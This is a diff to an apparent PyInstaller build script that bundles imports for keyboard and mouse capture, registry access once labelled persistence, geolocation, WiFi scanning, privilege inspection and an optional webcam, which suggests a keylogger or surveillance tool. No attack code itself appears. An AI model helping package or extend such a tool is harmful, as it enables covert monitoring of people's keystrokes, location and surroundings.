@@ -137,13 +137,27 @@ def main():
         "--hidden-import", "pynput.keyboard._xorg",
         "--hidden-import", "pynput.keyboard._darwin",
         "--hidden-import", "pynput.mouse",
-        # ── Registry persistence (winreg) ───────────────────────────────────
+        # ── Registry (winreg) ────────────────────────────────────────────────
         "--hidden-import", "winreg",
-        # ── GUI library (tkinter) ───────────────────────────────────────────
+        # ── GeoLocation + BeaconDB (urllib / json / ctypes) ─────────────────
+        "--hidden-import", "urllib",
+        "--hidden-import", "urllib.request",
+        "--hidden-import", "urllib.parse",
+        "--hidden-import", "json",
+        "--hidden-import", "ctypes",
+        "--hidden-import", "ctypes.wintypes",
+        # ── Privilege Inspector (winreg + subprocess already included) ────────
+        "--hidden-import", "struct",
+        # ── WiFi scan (subprocess + re already included) ──────────────────────
+        "--hidden-import", "re",
+        # ── GUI library (tkinter) ────────────────────────────────────────────
         "--hidden-import", "tkinter",
         "--hidden-import", "tkinter.messagebox",
-        # ── Webcam (opencv-python) — optional (adds ~50MB) ─────────────────
-        #"--hidden-import", "cv2",           # Uncomment if webcam is needed
+        "--hidden-import", "tkinter.filedialog",
+        # ── pynput — collect ALL platform backends ───────────────────────────
+        "--hidden-import", "pynput.keyboard._win32",
+        "--hidden-import", "pynput.mouse._win32",
+        "--collect-all", "pynput",
         temp_file
     ]
     
